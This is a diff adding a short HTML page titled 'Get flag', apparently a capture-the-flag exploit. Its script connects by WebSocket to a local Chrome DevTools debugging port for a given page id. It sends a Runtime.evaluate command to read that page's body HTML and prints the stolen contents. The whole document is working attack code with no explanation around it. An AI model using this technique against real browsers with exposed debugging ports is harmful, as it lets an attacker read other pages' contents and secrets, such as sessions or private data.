@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width" />
+        <title>Get flag</title>
+    </head>
+    <body>
+        <script>
+            const id = '7CA3838A85CD93467A53246F40354878'
+            window.ws = new WebSocket(`ws://127.0.0.1:40027/devtools/page/${id}`)
+            ws.onerror = (e => {document.writeln('error')})
+            ws.onmessage = (e => { document.writeln(`<pre>${e.data}</pre>`); })
+            ws.onopen = () => {
+                ws.send(JSON.stringify({
+                    id: 1,
+                    method: 'Runtime.evaluate',
+                    params: { expression: 'document.body.innerHTML' }
+                }))
+            }
+        </script>
+    </body>
+</html>
